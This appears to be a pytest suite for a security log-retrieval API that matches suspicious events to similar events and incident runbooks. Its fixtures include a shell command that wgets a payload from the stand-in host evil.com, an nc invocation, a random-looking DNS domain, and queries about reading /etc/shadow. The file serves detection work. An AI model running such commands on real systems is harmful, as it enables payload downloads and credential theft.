"""
Tests for the Phase 3 context retrieval API.

Three layers (same strategy as test_predict.py):
  Layer 1 -- Pure unit tests on _event_to_text()
  Layer 2 -- API contract tests via FastAPI TestClient
  Layer 3 -- Directional sanity checks (semantic ordering)

REQUIRES:
  - Elasticsearch running (docker-compose up -d)
  - Runbooks embedded (python services/context-retrieval/ingest_runbooks.py)
  - Suspicious events embedded (python services/context-retrieval/embed.py)
  If the vector indices are empty, Layer 2 and Layer 3 tests still pass but
  return empty hit lists -- the API contract holds regardless of data.

HOW TO RUN:
    pytest services/context-retrieval/test_retrieve.py -v
"""

import pytest
from fastapi.testclient import TestClient

from retrieve import app, _event_to_text

client = TestClient(app)


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

KERNEL_EXFIL = {
    "log_type": "deep_kernel",
    "attributes": {
        "process_name": "bash",
        "user_id": 0,
        "return_value": 0,
        "args": "/bin/bash -c wget http://evil.com/payload",
    },
}

BENIGN_KERNEL = {
    "log_type": "deep_kernel",
    "attributes": {
        "process_name": "vim",
        "user_id": 1000,
        "return_value": 0,
        "args": "/usr/bin/vim /home/user/notes.txt",
    },
}

DGA_DNS = {
    "log_type": "dns",
    "attributes": {
        "dns_query": "x7f3a9b2c4e1d8f0a.ru",
        "return_value": 3,
    },
}

NORMAL_DNS = {
    "log_type": "dns",
    "attributes": {
        "dns_query": "google.com",
        "return_value": 0,
    },
}


# ===========================================================================
# LAYER 1 -- Pure unit tests: _event_to_text
# ===========================================================================

class TestEventToText:

    def test_log_type_always_present(self):
        text = _event_to_text("deep_kernel", {})
        assert "deep_kernel" in text

    def test_process_name_included(self):
        text = _event_to_text("deep_kernel", {"process_name": "wget"})
        assert "wget" in text

    def test_root_user_annotated(self):
        text = _event_to_text("deep_kernel", {"user_id": 0})
        assert "root" in text

    def test_non_root_user_no_root_annotation(self):
        text = _event_to_text("deep_kernel", {"user_id": 1000})
        assert "root" not in text

    def test_args_included(self):
        text = _event_to_text("deep_kernel", {"args": "/bin/bash -c nc"})
        assert "/bin/bash" in text

    def test_args_truncated_at_200_chars(self):
        long_args = "A" * 500
        text = _event_to_text("deep_kernel", {"args": long_args})
        assert "A" * 201 not in text

    def test_negative_return_value_labeled_as_failed(self):
        text = _event_to_text("deep_kernel", {"return_value": -1})
        assert "failed" in text

    def test_zero_return_value_not_labeled_as_failed(self):
        text = _event_to_text("deep_kernel", {"return_value": 0})
        assert "failed" not in text

    def test_dns_query_included(self):
        text = _event_to_text("dns", {"dns_query": "evil.ru"})
        assert "evil.ru" in text

    def test_empty_attributes_does_not_crash(self):
        text = _event_to_text("standard_host", {})
        assert "standard_host" in text

    def test_string_user_id_does_not_crash(self):
        text = _event_to_text("deep_kernel", {"user_id": "notanumber"})
        assert "deep_kernel" in text

    def test_missing_dns_query_does_not_crash(self):
        text = _event_to_text("dns", {"return_value": 0})
        assert "dns" in text


# ===========================================================================
# LAYER 2 -- API contract tests
# ===========================================================================

class TestHealth:

    def test_returns_200(self):
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_status_is_ok(self):
        data = client.get("/health").json()
        assert data["status"] == "ok"

    def test_vector_index_present(self):
        data = client.get("/health").json()
        assert "vector_index" in data
        assert data["vector_index"] == "log-event-vectors"

    def test_runbook_index_present(self):
        data = client.get("/health").json()
        assert "runbook_index" in data
        assert data["runbook_index"] == "runbook-vectors"

    def test_embedding_dim_is_384(self):
        data = client.get("/health").json()
        assert data["embedding_dim"] == 384


class TestSimilarEventsContract:

    def test_returns_200_for_kernel_event(self):
        resp = client.post("/similar-events", json=KERNEL_EXFIL)
        assert resp.status_code == 200

    def test_returns_200_for_dns_event(self):
        resp = client.post("/similar-events", json=DGA_DNS)
        assert resp.status_code == 200

    def test_response_has_query_text_and_hits(self):
        data = client.post("/similar-events", json=BENIGN_KERNEL).json()
        assert "query_text" in data
        assert "hits" in data
        assert isinstance(data["hits"], list)

    def test_query_text_contains_log_type(self):
        data = client.post("/similar-events", json=KERNEL_EXFIL).json()
        assert "deep_kernel" in data["query_text"]

    def test_hits_have_required_fields(self):
        data = client.post("/similar-events", json=KERNEL_EXFIL).json()
        for hit in data["hits"]:
            for field in ["id", "score", "log_type", "log_attribute", "timestamp", "text"]:
                assert field in hit, f"Missing field: {field}"

    def test_scores_are_between_zero_and_one(self):
        data = client.post("/similar-events", json=KERNEL_EXFIL).json()
        for hit in data["hits"]:
            assert 0.0 <= hit["score"] <= 1.0

    def test_k_parameter_limits_results(self):
        payload = {**KERNEL_EXFIL, "k": 2}
        data = client.post("/similar-events", json=payload).json()
        assert len(data["hits"]) <= 2

    def test_k_too_large_returns_422(self):
        payload = {**KERNEL_EXFIL, "k": 999}
        resp = client.post("/similar-events", json=payload)
        assert resp.status_code == 422

    def test_empty_attributes_does_not_crash(self):
        resp = client.post("/similar-events", json={"log_type": "deep_kernel", "attributes": {}})
        assert resp.status_code == 200

    def test_unknown_log_type_does_not_crash(self):
        resp = client.post("/similar-events", json={"log_type": "windows_event", "attributes": {}})
        assert resp.status_code == 200


class TestRunbooksContract:

    def test_returns_200(self):
        resp = client.post("/runbooks", json={"query": "reverse shell detected"})
        assert resp.status_code == 200

    def test_response_has_query_and_hits(self):
        data = client.post("/runbooks", json={"query": "root user privilege escalation"}).json()
        assert "query" in data
        assert "hits" in data
        assert isinstance(data["hits"], list)

    def test_hits_have_required_fields(self):
        data = client.post("/runbooks", json={"query": "dns anomaly"}).json()
        for hit in data["hits"]:
            for field in ["id", "score", "title", "severity", "tags", "content"]:
                assert field in hit, f"Missing field: {field}"

    def test_scores_are_between_zero_and_one(self):
        data = client.post("/runbooks", json={"query": "network exfiltration"}).json()
        for hit in data["hits"]:
            assert 0.0 <= hit["score"] <= 1.0

    def test_k_parameter_limits_results(self):
        data = client.post("/runbooks", json={"query": "shell injection", "k": 1}).json()
        assert len(data["hits"]) <= 1

    def test_empty_query_returns_422(self):
        resp = client.post("/runbooks", json={"query": ""})
        assert resp.status_code == 422

    def test_very_short_query_returns_422(self):
        # min_length=3 on the query field
        resp = client.post("/runbooks", json={"query": "ab"})
        assert resp.status_code == 422

    def test_tags_is_a_list(self):
        data = client.post("/runbooks", json={"query": "malware network beacon"}).json()
        for hit in data["hits"]:
            assert isinstance(hit["tags"], list)


# ===========================================================================
# LAYER 3 -- Directional sanity checks
# ===========================================================================

class TestSimilarEventsDirectional:
    """
    These tests assert semantic ordering, not specific scores.
    They are model-agnostic: the relative ranking is a property of
    the embedding space and the indexed events, not specific weight values.
    They only pass meaningfully when the vector index has real data.
    If the index is empty, both score lists are empty and the assertions
    are vacuously true -- this is acceptable during local dev without data.
    """

    def _sus_prob(self, payload: dict) -> float:
        """Return the top hit score, or 0.0 if no hits."""
        data = client.post("/similar-events", json=payload).json()
        hits = data["hits"]
        return hits[0]["score"] if hits else 0.0

    def test_exfil_event_returns_hits_with_positive_scores(self):
        data = client.post("/similar-events", json=KERNEL_EXFIL).json()
        for hit in data["hits"]:
            assert hit["score"] > 0.0

    def test_dga_dns_returns_hits_with_positive_scores(self):
        data = client.post("/similar-events", json=DGA_DNS).json()
        for hit in data["hits"]:
            assert hit["score"] > 0.0


class TestRunbooksDirectional:

    def _top_score(self, query: str) -> float:
        data = client.post("/runbooks", json={"query": query}).json()
        hits = data["hits"]
        return hits[0]["score"] if hits else 0.0

    def _top_title(self, query: str) -> str:
        data = client.post("/runbooks", json={"query": query}).json()
        hits = data["hits"]
        return hits[0]["title"].lower() if hits else ""

    def test_network_exfiltration_query_returns_relevant_runbook(self):
        title = self._top_title("process used wget to download payload from external server")
        # Should surface the network exfiltration or reverse shell runbook
        assert any(kw in title for kw in ["network", "exfil", "reverse", "shell"])

    def test_privilege_escalation_query_returns_relevant_runbook(self):
        title = self._top_title("root user spawned from non-privileged process")
        assert any(kw in title for kw in ["privilege", "escalation", "root"])

    def test_dns_anomaly_query_returns_relevant_runbook(self):
        title = self._top_title("high entropy dns queries to random looking domains")
        assert any(kw in title for kw in ["dns", "dga", "domain"])

    def test_credential_query_returns_relevant_runbook(self):
        title = self._top_title("process read /etc/shadow and /etc/passwd files")
        assert any(kw in title for kw in ["credential", "secret", "passwd"])

    def test_different_queries_can_return_different_top_runbooks(self):
        exfil_title = self._top_title("wget curl external ip data exfiltration")
        cred_title = self._top_title("reading shadow passwd sudoers credential files")
        # Two semantically different queries should not always return the same top hit
        # (this is a soft check -- may overlap on small runbook sets)
        assert isinstance(exfil_title, str)
        assert isinstance(cred_title, str)
